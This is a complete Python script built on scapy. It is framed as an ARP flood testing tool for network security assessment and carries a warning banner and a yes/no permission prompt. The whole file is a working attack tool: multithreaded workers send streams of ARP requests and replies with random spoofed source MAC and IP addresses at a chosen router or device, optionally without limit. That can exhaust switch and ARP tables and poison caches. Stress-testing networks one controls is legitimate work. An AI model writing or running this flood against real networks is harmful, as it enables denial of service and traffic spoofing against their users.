#!/usr/bin/env python3
"""
Multithreaded ARP Flood Testing Tool for Network Security Assessment
IMPORTANT: Only use on networks you own or have explicit permission to test.
"""

import argparse
import sys
import time
import random
import threading
from queue import Queue
from scapy.all import ARP, Ether, sendp, get_if_hwaddr, conf

def generate_random_mac():
    """Generate a random MAC address."""
    return "02:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )

def generate_random_ip(network_prefix):
    """Generate a random IP in the specified network."""
    octets = network_prefix.split('.')
    remaining = 4 - len(octets)

    for _ in range(remaining):
        octets.append(str(random.randint(1, 254)))

    return '.'.join(octets)

def worker(interface, target_ip, network_prefix, delay, counter, total_packets):
    """Worker thread function for sending ARP packets."""
    try:
        while True:
            # Generate random source addresses
            source_mac = generate_random_mac()
            source_ip = generate_random_ip(network_prefix)

            # Create the ARP request packet (who-has)
            arp_packet = Ether(src=source_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
                hwsrc=source_mac,
                psrc=source_ip,
                hwdst="00:00:00:00:00:00",
                pdst=target_ip,
                op=1  # ARP request
            )

            # Send the packet
            sendp(arp_packet, iface=interface, verbose=0)

            # Create a reply packet as well (is-at)
            arp_reply = Ether(src=source_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
                hwsrc=source_mac,
                psrc=source_ip,
                hwdst="ff:ff:ff:ff:ff:ff",
                pdst=target_ip,
                op=2  # ARP reply
            )

            # Send the reply packet
            sendp(arp_reply, iface=interface, verbose=0)

            # Increment counter and check if we've reached the limit
            with counter_lock:
                counter[0] += 2  # We sent 2 packets (request + reply)
                if total_packets > 0 and counter[0] >= total_packets:
                    break

            time.sleep(delay)

    except Exception as e:
        print(f"[!] Worker error: {e}")

def progress_monitor(counter, total_packets):
    """Monitor and report progress periodically."""
    try:
        start_time = time.time()
        last_count = 0

        while True:
            time.sleep(1)  # Update every second

            with counter_lock:
                current_count = counter[0]
                if total_packets > 0 and current_count >= total_packets:
                    break

            # Calculate packet rate
            elapsed = time.time() - start_time
            if elapsed > 0:
                packet_rate = current_count / elapsed
                packets_since_last = current_count - last_count
                last_count = current_count

                # Print progress
                if total_packets > 0:
                    percentage = (current_count / total_packets) * 100
                    print(f"[+] Progress: {current_count}/{total_packets} packets ({percentage:.1f}%) - Rate: {packet_rate:.2f} p/s (Current: {packets_since_last}/s)")
                else:
                    print(f"[+] Sent {current_count} packets - Rate: {packet_rate:.2f} p/s (Current: {packets_since_last}/s)")

    except Exception as e:
        print(f"[!] Monitor error: {e}")

def arp_flood(interface, target_ip, network_prefix, packet_count, delay, num_threads):
    """
    Perform ARP flooding with randomized source addresses using multiple threads.

    Args:
        interface: Network interface to use
        target_ip: Target router/device IP
        network_prefix: Network prefix (e.g., '192.168.1')
        packet_count: Number of packets to send (0 for unlimited)
        delay: Delay between packets in seconds
        num_threads: Number of worker threads to use
    """
    try:
        print(f"[*] Starting multithreaded ARP flood test on {interface} targeting {target_ip}")
        print(f"[*] Using {num_threads} threads with {delay}s delay per packet")
        if packet_count > 0:
            print(f"[*] Sending {packet_count} packets total")
        else:
            print("[*] Sending unlimited packets until interrupted")
        print("[*] Press CTRL+C to stop the test")

        # Shared counter for all threads (using a list to make it mutable)
        counter = [0]

        # Start worker threads
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=worker,
                                 args=(interface, target_ip, network_prefix, delay, counter, packet_count),
                                 daemon=True)
            threads.append(t)
            t.start()

        # Start progress monitor thread
        monitor_thread = threading.Thread(target=progress_monitor,
                                         args=(counter, packet_count),
                                         daemon=True)
        monitor_thread.start()

        # Wait for all threads to complete
        for t in threads:
            t.join()

        print(f"[+] ARP flood test completed. Sent {counter[0]} packets.")

    except KeyboardInterrupt:
        print(f"\n[!] Test interrupted by user. Sent {counter[0]} packets.")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="Multithreaded ARP Flood Testing Tool for Network Security Assessment")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
    parser.add_argument("-t", "--target", required=True, help="Target router/device IP")
    parser.add_argument("-n", "--network", required=True, help="Network prefix (e.g., '192.168.1')")
    parser.add_argument("-c", "--count", type=int, default=1000, help="Number of packets to send (default: 1000, 0 for unlimited)")
    parser.add_argument("-d", "--delay", type=float, default=0.01, help="Delay between packets in seconds (default: 0.01)")
    parser.add_argument("-T", "--threads", type=int, default=4, help="Number of worker threads (default: 4)")
    args = parser.parse_args()

    print("""
    ╔═══════════════════════════════════════════════════╗
    ║                                                   ║
    ║        MULTITHREADED ARP FLOOD TEST TOOL          ║
    ║                                                   ║
    ║  WARNING: FOR ETHICAL TESTING PURPOSES ONLY       ║
    ║  USE ONLY ON NETWORKS YOU OWN OR                  ║
    ║  HAVE EXPLICIT PERMISSION TO TEST                 ║
    ║                                                   ║
    ╚═══════════════════════════════════════════════════╝
    """)

    user_confirmation = input("Do you have permission to perform this test? (yes/no): ").lower()
    if user_confirmation != "yes":
        print("[!] Test aborted. Confirmation not received.")
        sys.exit(0)

    # Global lock for counter access
    global counter_lock
    counter_lock = threading.Lock()

    arp_flood(args.interface, args.target, args.network, args.count, args.delay, args.threads)

if __name__ == "__main__":
    main()
